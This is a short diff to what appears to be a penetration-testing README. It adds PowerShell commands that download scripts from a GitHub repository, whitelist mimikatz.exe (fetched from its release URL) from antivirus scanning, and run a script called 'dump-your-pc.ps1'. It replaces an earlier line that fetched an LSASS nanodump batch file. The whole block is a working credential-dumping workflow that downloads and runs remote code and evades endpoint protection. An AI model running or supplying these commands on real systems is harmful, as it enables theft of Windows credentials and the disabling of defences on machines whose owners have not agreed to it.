@@ -2,7 +2,9 @@
 
 ```powershell
 Invoke-WebRequest "https://raw.githubusercontent.com/PentestPlaybook/verify-then-trust/main/Add-TrustedFileExclusion.ps1" -OutFile "Add-TrustedFileExclusion.ps1" -UseBasicParsing
-Invoke-WebRequest "https://raw.githubusercontent.com/PentestPlaybook/verify-then-trust/main/lsass_nanodump.bat" -OutFile "lsass_nanodump.bat" -UseBasicParsing
+Invoke-WebRequest "https://raw.githubusercontent.com/PentestPlaybook/verify-then-trust/main/dump-your-pc.ps1" -OutFile "dump-your-pc.ps1" -UseBasicParsing
+.\Add-TrustedFileExclusion.ps1 -FilePath ".\mimikatz.exe" -URL "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"
+.\dump-your-pc.ps1
 ```
 
 ---
